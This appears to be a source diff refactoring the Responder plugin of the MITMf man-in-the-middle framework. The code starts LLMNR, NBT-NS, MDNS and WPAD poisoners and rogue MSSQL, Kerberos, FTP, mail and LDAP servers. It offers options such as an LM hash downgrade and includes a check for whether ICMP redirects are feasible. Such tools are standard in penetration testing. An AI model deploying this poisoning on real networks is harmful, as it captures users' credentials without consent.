@@ -18,56 +18,111 @@
 # USA
 #
 
-import sys
-import os
-import threading
-
 from plugins.plugin import Plugin
-from libs.responder.Responder import ResponderMITMf
-from core.sslstrip.DnsCache import DnsCache
 from twisted.internet import reactor
+from core.utils import SystemConfig, shutdown
+
+from core.responder.llmnr.LLMNRPoisoner import LLMNRPoisoner
+from core.responder.mdns.MDNSPoisoner import MDNSPoisoner
+from core.responder.nbtns.NBTNSPoisoner import NBTNSPoisoner
+from core.responder.fingerprinter.LANFingerprinter import LANFingerprinter
+from core.responder.wpad.WPADPoisoner import WPADPoisoner
 
 class Responder(Plugin):
     name        = "Responder"
     optname     = "responder"
     desc        = "Poison LLMNR, NBT-NS and MDNS requests"
-    tree_output = ["NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online"]
+    tree_info   = ["NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online"]
     version     = "0.2"
     has_opts    = True
 
     def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
-        self.options = options
+        self.options   = options
         self.interface = options.interface
+        self.ourip     = SystemConfig.getIP(options.interface)
 
         try:
-            config = options.configfile['Responder']
-        except Exception, e:
-            sys.exit('[-] Error parsing config for Responder: ' + str(e))
+            config = self.config['Responder']
+            smbChal = self.config['MITMf']['SMB']['Challenge']
+        except Exception as e:
+            shutdown('[-] Error parsing config for Responder: ' + str(e))
 
-        if options.Analyze:
-            self.tree_output.append("Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned")
+        LANFingerprinter().start(options)
+        MDNSPoisoner().start(options, self.ourip)
+        NBTNSPoisoner().start(options, self.ourip)
+        LLMNRPoisoner().start(options, self.ourip)
 
-        resp = ResponderMITMf()
-        resp.setCoreVars(options, config)
+        if options.wpad:
+            from core.responder.wpad.WPADPoisoner import WPADPoisoner
+            WPADPoisoner().start(options)
 
-        result = resp.AnalyzeICMPRedirect()
-        if result:
-            for line in result:
-                self.tree_output.append(line)
+        if self.config["Responder"]["MSSQL"].lower() == "on":
+            from core.responder.mssql.MSSQLServer import MSSQLServer
+            MSSQLServer().start(smbChal)
 
-        resp.printDebugInfo()
-        resp.start()
+        if self.config["Responder"]["Kerberos"].lower() == "on":
+            from core.responder.kerberos.KERBServer import KERBServer
+            KERBServer().start()
 
-    def plugin_reactor(self, strippingFactory):
+        if self.config["Responder"]["FTP"].lower() == "on":
+            from core.responder.ftp.FTPServer import FTPServer
+            FTPServer().start()
+
+        if self.config["Responder"]["POP"].lower() == "on":
+            from core.responder.pop3.POP3Server import POP3Server
+            POP3Server().start()
+
+        if self.config["Responder"]["SMTP"].lower() == "on":
+            from core.responder.smtp.SMTPServer import SMTPServer
+            SMTPServer().start()
+
+        if self.config["Responder"]["IMAP"].lower() == "on":
+            from core.responder.imap.IMAPServer import IMAPServer
+            IMAPServer().start()
+
+        if self.config["Responder"]["LDAP"].lower() == "on":
+            from core.responder.ldap.LDAPServer import LDAPServer
+            LDAPServer().start(smbChal)
+
+        if options.analyze:
+            self.tree_info.append("Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned")
+            self.IsICMPRedirectPlausible(self.ourip)
+    
+    def IsICMPRedirectPlausible(self, IP):
+        result = []
+        dnsip = []
+        for line in file('/etc/resolv.conf', 'r'): 
+            ip = line.split()
+            if len(ip) < 2:
+               continue
+            if ip[0] == 'nameserver':
+                dnsip.extend(ip[1:])
+        
+        for x in dnsip:
+            if x !="127.0.0.1" and self.IsOnTheSameSubnet(x,IP) == False:
+                self.tree_info.append("You can ICMP Redirect on this network. This workstation ({}) is not on the same subnet than the DNS server ({})".format(IP, x))
+            else:
+                pass
+
+    def IsOnTheSameSubnet(self, ip, net):
+        net = net+'/24'
+        ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
+        netstr, bits = net.split('/')
+        netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
+        mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
+        return (ipaddr & mask) == (netaddr & mask)
+
+    def pluginReactor(self, strippingFactory):
         reactor.listenTCP(3141, strippingFactory)
 
-    def add_options(self, options):
-        options.add_argument('--analyze', dest="Analyze", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
-        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
-        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
-        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
-        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
-        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
-        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
-        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
+    def pluginOptions(self, options):
+        options.add_argument('--analyze', dest="analyze", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
+        options.add_argument('--wredir', dest="wredir", default=False, action="store_true", help="Enables answers for netbios wredir suffix queries")
+        options.add_argument('--nbtns', dest="nbtns", default=False, action="store_true", help="Enables answers for netbios domain suffix queries")
+        options.add_argument('--fingerprint', dest="finger", default=False, action="store_true", help = "Fingerprint hosts that issued an NBT-NS or LLMNR query")
+        options.add_argument('--lm', dest="lm", default=False, action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier")
+        options.add_argument('--wpad', dest="wpad", default=False, action="store_true", help = "Start the WPAD rogue proxy server")
+        # Removed these options until I find a better way of implementing them
+        #options.add_argument('--forcewpadauth', dest="forceWpadAuth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
+        #options.add_argument('--basic', dest="basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
